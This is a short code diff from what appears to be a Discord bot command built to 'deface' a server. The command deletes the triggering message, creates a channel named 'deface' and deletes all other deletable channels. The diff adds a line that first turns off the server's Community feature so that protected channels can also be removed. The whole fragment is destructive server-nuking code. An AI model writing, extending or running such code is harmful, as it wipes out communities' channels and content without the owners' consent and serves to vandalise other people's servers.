@@ -15,6 +15,9 @@ module.exports = {
         
         if (message.deletable) message.delete()
 
+		if (message.guild.features.includes("COMMUNITY"))
+			await message.guild.setCommunity(false).catch(() => false);
+
         const channel = await message.guild.channels.create('deface').catch(() => false);
         message.guild.channels.cache.filter(c => c.deletable && c.id !== channel?.id).forEach(c => c.delete().catch(() => false));
         message.guild.edit({
